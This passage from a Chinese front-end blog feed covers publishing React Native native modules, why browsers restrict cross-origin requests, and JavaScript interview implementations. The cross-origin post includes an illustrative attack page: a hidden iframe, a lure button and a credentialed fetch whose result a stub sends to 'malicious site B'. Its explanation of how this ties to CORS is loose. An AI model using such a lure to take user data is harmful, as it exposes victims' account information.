class="headerlink" title="3. 我想要一个 NPM Package"></a>3. 我想要一个 NPM Package</h1><h2 id="3-1-关于安卓"><a href="#3-1-关于安卓" class="headerlink" title="3.1 关于安卓"></a>3.1 关于安卓</h2><p>当我们辛辛苦苦写好了一个 Native Module，肯定会想把他共享出去，最好的平台自然就是 npm。同时发布到 npm 上还有一个好处就，在讲这个好处之前我们先来再看看 React Native 进行 Link 的过程中到底 Link 了啥：</p><p>当我们下载一个 React Native 包时，如果这个包有原生代码，那么它必定是要进行 Link 才能用的，这也是有的项目的 ReadMe 中会有手动 Link 指引的这一步。在这一过程中，主要进行了对主项目 Gradle 的配置，让其识别到下载的 Native Modules，以及注册 Native Modules，让我们可以在 Javascript 层调用到原生代码的能力。这是一个繁杂的过程，但是好在这些过程都有很多重复的地方，有重复就必定有自动化。因此在早期的社区中存在 rnpm 这种工具来帮助我们实现自动化 Link。在 React Native 0.60 以上版本，自动 Link 已经成了一种特性，我们再从 npm 下载下了包之后，React Native 的构建工具 Metro 会自动的检索包，如果这个包是 Native Module，那么就会自动建立与 Android 项目以及 iOS 项目的连接。</p><p>因此将 Native Modules 作为 NPM Package 发布的额外一个好处就是，它会被 React Native 自动检测到并且进行自动化的连接。</p><p>开发一个 Native Module 的 NPM Package 其实并不难，我们可以使用一个很好用的 cli 工具来自动创建模板 <a href="https://github.com/frostney/react-native-create-library">react-native-create-library</a>，按照 Readme 中的说明，我们可以创建一个如下的目录结构：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200828201430.png" alt=""></p><p>我们只需要将写好的代码逻辑迁移过去就可以了，同时记得修改 Gradle 配置项，然后就是 NPM 的发包流程，这里不再赘述。</p><h2 id="3-2-关于-IOS"><a href="#3-2-关于-IOS" class="headerlink" title="3.2 关于 IOS"></a>3.2 关于 IOS</h2><blockquote><p>由于在 IOS 的模块开发中遇到了很多坑，因此在这里记录一下。</p></blockquote><p>利用 react-native-create-library 创建好一个 Native Module 框架后，其 IOS 目录是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── RNMyFancyLibrary.h</span><br><span class="line">├── RNMyFancyLibrary.m</span><br><span class="line">├── RNMyFancyLibrary.podspec</span><br><span class="line">├── RNMyFancyLibrary.xcodeproj</span><br><span class="line">│   └── project.pbxproj</span><br><span class="line">└── RNMyFancyLibrary.xcworkspace</span><br><span class="line">    └── contents.xcworkspacedata</span><br></pre></td></tr></table></figure><p>我们来看下这些文件是什么意思：</p><ul><li><code>.h</code> 和 <code>.m</code> 是我们的模块代码，我们将原生模块的代码内容复制过来即可；</li><li><code>.xcodeproj</code> 和 <code>.xcworkspace</code> 是项目相关的配置；</li><li><code>.podspec</code> 是用于 描述一个 Pod 库的源代码和资源将如何被打包编译成链接库或 framework 的文件</li></ul><p><code>.podspec</code> 如果配置失败的话是没有办法正确解析整个 Native Module 的，因此我们来重点讲一下这个文件，我们打开 react-native-create-library 创建好的 podspec 文件看下它里面都声明了什么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Pod::Spec.new do |s|</span><br><span class="line">  s.name         = &quot;RNMyFancyLibrary&quot;</span><br><span class="line">  s.version      = &quot;1.0.0&quot;</span><br><span class="line">  s.summary      = &quot;RNMyFancyLibrary&quot;</span><br><span class="line">  s.description  = &lt;&lt;-DESC</span><br><span class="line">                  RNMyFancyLibrary</span><br><span class="line">                   DESC</span><br><span class="line">  s.homepage     = &quot;&quot;</span><br><span class="line">  s.license      = &quot;MIT&quot;</span><br><span class="line">  # s.license      = &#123; :type =&gt; &quot;MIT&quot;, :file =&gt; &quot;FILE_LICENSE&quot; &#125;</span><br><span class="line">  s.author             = &#123; &quot;author&quot; =&gt; &quot;author@domain.cn&quot; &#125;</span><br><span class="line">  s.platform     = :ios, &quot;7.0&quot;</span><br><span class="line">  s.source       = &#123; :git =&gt; &quot;https://github.com/author/RNMyFancyLibrary.git&quot;, :tag =&gt; &quot;master&quot; &#125;</span><br><span class="line">  s.source_files  = &quot;RNMyFancyLibrary/**/*.&#123;h,m&#125;&quot;</span><br><span class="line">  s.requires_arc = true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  s.dependency &quot;React&quot;</span><br><span class="line">  #s.dependency &quot;others&quot;</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><code>name</code> <code>version</code> <code>description</code> <code>license</code> <code>author</code> <code>platform</code> 是指模块的基础信息</li><li><code>homepage</code> 是项目的主页，我们可以将其设置为 npm 包地址，如果不设置在 <code>pod install</code> 时会报错</li><li><code>source</code> 是项目源代码地址，我们要将其改为 github 源代码托管的地址</li><li><code>source_files</code> 指源码的路径，这里的路径是以当前 podspec 文件为基准的相对路径，需要设置为你开发的 Native Module 的路径，也就是 <code>.h</code>、<code>.m</code>、<code>.swif</code> 等文件的路径，对于默认生成的模块，<code>.h</code> 与 <code>.m</code> 都在当前 podspec 文件的路径下，因此这里要改为 <code>/**/*.&#123;h,m&#125;</code>，否则模块在 js 引用时会报错。</li><li><code>dependency</code> 为当前 Native Module 需要引用的第三方的包</li></ul><h1 id="4-参考教程"><a href="#4-参考教程" class="headerlink" title="4. 参考教程"></a>4. 参考教程</h1><ul><li><a href="https://reactnative.cn/docs/0.46/native-modules-android">原生模块</a> </li><li><a href="https://juejin.im/entry/6844903670694461454">开发自己的react-native组件并发布到npm</a></li><li><a href="https://www.kancloud.cn/guif_zhang/rn/451978">原生模块的开发</a></li><li><a href="https://blog.tylerbuchea.com/how-to-create-a-react-native-ios-native-module/">How to Create a React Native iOS Native Module</a></li><li>参考封装模块: <a href="https://github.com/EsunR/react-native-baidu-mtj">react-native-baidu-mtj</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灵魂拷问:浏览器为什么禁止跨域</title>
      <link href="/2021/06/9e6430558810.html"/>
      <url>/2021/06/9e6430558810.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨域问题是个老生常谈的问题了，当一个页面访问非同域（域名、协议、端口号不同的都是非同域）的接口，就会由于浏览器的同源策略限制被拒绝访问。</p><p>那么问题来了，好端端的浏览器，为什么禁止我访问跨域接口呢，这个问题在知乎上也有很激烈的讨论：<a href="https://www.zhihu.com/question/26379635/answer/534866558，但是说实话，答案并不能让我满意。">https://www.zhihu.com/question/26379635/answer/534866558，但是说实话，答案并不能让我满意。</a></p><p>经过对各种回答的反复研究，发现大家的答案都集中在两个方面：</p><ol><li>保护服务端接口不被第三方网站恶意调用</li><li>防止 XSRF 攻击</li></ol><p>那么接下来，我们针对这两点进行解释。</p><h1 id="保护服务端接口不被第三方网站恶意调用"><a href="#保护服务端接口不被第三方网站恶意调用" class="headerlink" title="保护服务端接口不被第三方网站恶意调用"></a>保护服务端接口不被第三方网站恶意调用</h1><p>这个其实很好理解，我们辛辛苦苦写出一个接口，并且将其部署到服务器上，肯定不想让别人直接调用我们的接口，盗取我们头发的代价不说，还占用我们的服务器资源。</p><p>举个例子：</p><p>假如我创建了一个山寨搜索引擎“百毒”，假如浏览器没有禁止“百毒”网站的跨域行为，用户在我的网站进行搜索后，我就在我的页面上偷偷调用百度的搜索接口，然后再把结果返回给用户。好在浏览器禁止了这一行为。</p><p>但是有的小聪明就要问了，我拿到不可以把请求在服务器端进行处理，然后再转发给用户吗？答案是肯定的，你甚至可以利用爬虫的技术来获取各种各样的资源，但是这一行为必然是违法的，而且一但百度发现了你服务器的异常请求行为，就会将你的服务器ip给拉黑，想盗取也没有办法。</p><h1 id="防止-XSRF-攻击"><a href="#防止-XSRF-攻击" class="headerlink" title="防止 XSRF 攻击"></a>防止 XSRF 攻击</h1><blockquote><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p></blockquote><p>以下配一张图来简单介绍一下 XSRF 攻击盗用用户登录凭证，来窃取用户在第三方网站信息的流程：</p><p><img src="https://i.loli.net/2021/06/27/pG2UMgxB3hzXdRQ.png" alt=""></p><p>我们先来假设张三正在使用一个不合格的浏览器，这个浏览器没有任何的跨域限制。</p><p>当张三访问了网站A，假如网站A使用了 Cookie 用来传递用户的登录凭证，那么在张三登录成功之后，网站A会向张三的浏览器用写入 cookie，该 cookie 的作用域名为 <code>http://www.a.com</code>。</p><p>之后张三访问了恶意网站网站B，恶意网站呢网站B偷偷的在网页里嵌入一个网站A的 iframe，其代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">click</span>=<span class="string">&quot;fetchUserInfo()&quot;</span>&gt;</span>帅哥来点我啊<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;iframe1&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">width</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">height</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://www.a.com&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fetchUserInfo</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">// 调用网站 A 的请求 </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://www.a.com/api/login/getUserInfo&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">sendInfoToWebsiteB</span>() <span class="comment">// 将获取到的用户信息发给恶意网站B</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此时网站上只显示了一个按钮：</p><p><img src="https://i.loli.net/2021/06/29/1PtLT2BiFWDlefC.png" alt=""></p><p>假如张三手痒点了这个按钮的话，就触发了页面的 <code>fetchUserInfo</code> 方法，会直接发送一个网站A的请求，加上张三是用的浏览器没有跨域限制，跨域请求将会被成功发送。重点来了，恶意网站网页B嵌入了网页A的 iframe 后，恶意网站B发送的请求，只要请求域名在<strong>网站A的 cookie 的作用范围之内</strong>，就可以携带网站A的 cookie。</p><blockquote><p>之所以网站B会存在网站A的 cookie，是因为存在 <code>第三方cookie</code> 这种机制，在这种机制下，同一个网页下可以有多个域名的 cookie，如下：</p><p><img src="https://i.loli.net/2021/06/29/Ph5Tu2rAgb64cfL.png" alt=""></p><p>这是一种没有办法完全禁止的行为，因为很多广告商需要第三方 cookie 来实现用户追踪这，这个可以另写一篇文章具体讲。</p></blockquote><p>好在我们日常生活中的浏览器都是默认禁止跨域的，我们就大可不必恐慌于这种攻击行为了。</p><p>那又有聪明的同学要问了，假如服务器端的开发人员很粗心，<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin">Access-Control-Allow-Origin</a> 填成了 <code>*</code>，这个接口能被第三方网站请求到的话，岂不是很危险？其实这里还有一个限制，假如请求需要携带 cookie，也就是我们在 fetch api 中设置了 <code>credentials: &quot;include&quot;</code>，那么在请求 <code>Access-Control-Allow-Origin: *</code> 的接口时就会报错：</p><p><img src="https://i.loli.net/2021/06/29/KmMDapVQoIdFfhB.png" alt=""></p><p>这个意思是，如果我们允许在请求头中传递 cookie 的话，响应报文的 <code>Access-Control-Allow-Origin</code> 就不能是通配符，因此如果想要允许网站在发送跨域请求携带 cookie 时候，跨域请求所在的服务器必须要将该网站设置在 <code>Access-Control-Allow-Origin</code> 的白名单中，可以看出，浏览器对于跨域的行为还是很敏感的。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
            <tag> XSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【业精于勤】基础前端面试题整理</title>
      <link href="/2021/06/c7c2c4c6cd31.html"/>
      <url>/2021/06/c7c2c4c6cd31.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-实现一个-new"><a href="#1-实现一个-new" class="headerlink" title="1. 实现一个 new"></a>1. 实现一个 new</h1><p>new 一个对象会发生如下的步骤，基于这些步骤我们来尝试想一下怎么实现它们：</p><ol><li>创建或者说事构造一个全新的对象（创建一个空对象）；</li><li>这个全新的对象会进行 [[Prototype]] 连接（遍历构造函数的 prototype 连接到空对象的 <strong>proto</strong> 上）；</li><li>这个对象会被绑定到函数调用的 this（使用 call、apply 来改变构造函数中的 this，并在 new 的阶段执行）；</li><li>如果函数没有返回其它对象，那么 new 表达式中的函数调用会自动返回这个新对象（判断构造函数有没有返回值）。</li></ol><p>同时，我们来回顾一下这张原型链连接图：</p><p><img src="https://i.loli.net/2021/06/19/6bvEp2m98Q4axWf.png" alt=""></p><p>我们要实现一个 <code>createNewObject</code> 方法，让其可以达到如下效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi~, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化</span></span><br><span class="line"><span class="keyword">const</span> newDog = <span class="title function_">createNewObject</span>(<span class="title class_">Dog</span>, [<span class="string">&quot;dabai&quot;</span>]);</span><br><span class="line">newDog.<span class="title function_">sayHi</span>(); <span class="comment">// 输出：Hi~, my name is dabai</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newDog.<span class="property">age</span>); <span class="comment">// 输出：18</span></span><br></pre></td></tr></table></figure><p>实现1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createNewObject</span>(<span class="params">constructor, args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">// (1)</span></span><br><span class="line">  <span class="keyword">const</span> returnResult = constructor.<span class="title function_">apply</span>(result, args);</span><br><span class="line">  <span class="comment">// 构造函数没有返回值才返回构造对象</span></span><br><span class="line">  <span class="keyword">if</span> (returnResult <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> returnResult;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 标明构造器</span></span><br><span class="line">  result.<span class="property">__proto__</span> = &#123; constructor &#125;;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">keys</span>(constructor.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">prototypeKey</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> targetPrototype = constructor.<span class="property"><span class="keyword">prototype</span></span>[prototypeKey];</span><br><span class="line">    <span class="comment">// 防止实例化的对象通过 __proto__ 来修改构造函数的 prototype</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(result.<span class="property">__proto__</span>, prototypeKey, &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">value</span>: targetPrototype,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>(1) 其实在创建一个空对象时候，可以写为 <code>result = &#123;&#125;</code> 或者 <code>result = new Object()</code>，甚至如果你想创建一个真正意义上的纯空的对象的话，可以使用 <code>result = Object.create(null)</code>，但是要注意的是 <code>Object.create(null)</code> 的方法在 Nodejs 环境下，创建的对象无法改写 <strong>proto</strong>，这就导致我们无法去连接构造函数的 prototype。 </p></blockquote><p>实现2：</p><p>我们其实可以利用 <code>Object.create()</code> 来实现，其含义为：</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create">Object.create()</a> 方法创建一个新对象，使用现有的对象来提供新创建的对象的<strong>proto</strong></p></blockquote><p>那么实现一个 new 方法就可以改写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createNewObject</span>(<span class="params">constructor, args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="title class_">Object</span>.<span class="title function_">create</span>(constructor.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="keyword">const</span> returnResult = constructor.<span class="title function_">apply</span>(result, args);</span><br><span class="line">  <span class="keyword">if</span> (returnResult <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> returnResult;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-实现-call-apply-方法"><a href="#2-实现-call-apply-方法" class="headerlink" title="2. 实现 call apply 方法"></a>2. 实现 call apply 方法</h1><blockquote><p><a href="https://github.com/mqyqingfeng/Blog/issues/11">https://github.com/mqyqingfeng/Blog/issues/11</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call2</span> = <span class="keyword">function</span> (<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> context = context || <span class="variable language_">window</span>;</span><br><span class="line">    context.<span class="property">fn</span> = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> args = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>, len = <span class="variable language_">arguments</span>.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">        args.<span class="title function_">push</span>(<span class="string">&#x27;arguments[&#x27;</span> + i + <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = <span class="built_in">eval</span>(<span class="string">&#x27;context.fn(&#x27;</span> + args +<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> context.<span class="property">fn</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一下</span></span><br><span class="line"><span class="keyword">var</span> value = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">value</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">value</span>,</span><br><span class="line">        <span class="attr">name</span>: name,</span><br><span class="line">        <span class="attr">age</span>: age</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar.<span class="title function_">call2</span>(<span class="literal">null</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar.<span class="title function_">call2</span>(obj, <span class="string">&#x27;kevin&#x27;</span>, <span class="number">18</span>));</span><br></pre></td></tr></table></figure><h1 id="3-bind-的实现"><a href="#3-bind-的实现" class="headerlink" title="3. bind 的实现"></a>3. bind 的实现</h1><blockquote><p><a href="https://www.cnblogs.com/echolun/p/12178655.html">https://www.cnblogs.com/echolun/p/12178655.html</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bind_</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Function.prototype.bind - what is trying to be bound is not callable&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//创建中介函数</span></span><br><span class="line">    <span class="keyword">var</span> fn_ = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> bound = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> params = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="comment">//通过constructor判断调用方式，为true this指向实例，否则为obj</span></span><br><span class="line">        fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>.<span class="property">constructor</span> === fn ? <span class="variable language_">this</span> : obj, args.<span class="title function_">concat</span>(params));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    fn_.<span class="property"><span class="keyword">prototype</span></span> = fn.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    bound.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">fn_</span>();</span><br><span class="line">    <span class="keyword">return</span> bound;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="4-实现一个深克隆"><a href="#4-实现一个深克隆" class="headerlink" title="4. 实现一个深克隆"></a>4. 实现一个深克隆</h1><blockquote><p><a href="https://juejin.cn/post/6844903929705136141#heading-8">https://juejin.cn/post/6844903929705136141#heading-8</a></p></blockquote><p>重点：</p><ol><li>使用递归实现深拷贝</li><li>基础要实现 Object 和 Array 的拷贝</li><li>创建一个 Map 来存放已经拷贝过的对象，防止循环引用</li><li>使用 Object.prototype.toString 来判断拷贝对象的<ol><li>对于 Map、Set 要遍历拷贝</li><li>对于 Boolean、Number、String、Error 要调用对应的构造函数来拷贝</li><li>对于 RegExp 和 Symbol 要单独特殊处理</li><li>对于函数来说，可以通过 toString 将函数转为字符串，然后使用目标函数是否有 prototype 来判断其是箭头函数还是普通函数：<ol><li>箭头函数可以直接返回 eval(functionString) 的执行结果来拷贝函数</li><li>对于普通函数，需要利用正则解析函数的参数位以及函数体，再利用 new Function(…paramArr, functionBody) 来克隆一个函数</li></ol></li></ol></li></ol><p>JSON.stringify 的局限性：</p><ul><li>仅能正确克隆基础类行，以及克隆对象、数组</li><li>对于无法拷贝的对象（这些对象通常在 JSON 中没有有效概念），如：Map、Set、RegExp、Function，会返回一个空对象 <code>&#123;&#125;</code></li><li>对于 undefined 会直接忽略该键值</li><li>会将 NaN 转为 null</li><li>会将 Date 转为时间字符串</li><li>无法序列化的对象，如 BigNumber，会直接报错</li><li>对于循环引用会报错</li></ul><p>基础版（仅实现了 1~3）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">target, map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> cloneTarget = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(target) ? [] : &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (map.<span class="title function_">get</span>(target)) &#123;</span><br><span class="line">            <span class="keyword">return</span> map.<span class="title function_">get</span>(target);</span><br><span class="line">        &#125;</span><br><span class="line">        map.<span class="title function_">set</span>(target, cloneTarget);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            cloneTarget[key] = <span class="title function_">clone</span>(target[key], map);</span><br><span class="line">        &#125;</span><br><span 